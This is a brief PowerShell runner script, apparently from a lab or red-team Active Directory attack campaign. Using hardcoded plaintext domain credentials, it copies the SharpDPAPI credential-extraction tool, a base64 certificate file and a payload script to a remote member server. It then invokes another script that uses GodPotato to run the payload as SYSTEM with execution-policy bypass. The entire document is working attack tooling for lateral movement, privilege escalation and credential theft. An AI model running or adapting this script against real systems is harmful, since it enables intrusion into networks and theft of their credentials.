# Runner: stage DER base64 + run 3.5G step2c
$ErrorActionPreference = 'Stop'
$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', (ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force))
$session = New-PSSession -ComputerName 'mbr01.child.cadre.local' -Credential $cred
Copy-Item -Path 'C:\Tools\ADTools\wt035g-der-b64.txt' -Destination 'C:\Windows\Temp\cadre-tools\wt035g-der-b64.txt' -ToSession $session -Force
Copy-Item -Path 'C:\Tools\ADTools\SharpDPAPI.exe' -Destination 'C:\Windows\Temp\cadre-tools\SharpDPAPI.exe' -ToSession $session -Force
Copy-Item -Path "$PSScriptRoot\wt035g-step2c-payload.ps1" -Destination 'C:\Windows\Temp\cadre-tools\wt035g-step2c-payload.ps1' -ToSession $session -Force
Remove-PSSession $session
Write-Output 'STAGED_DER_B64'
& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock "powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\cadre-tools\wt035g-step2c-payload.ps1"
Write-Output '3.5G_STEP2C_RUN_DONE'
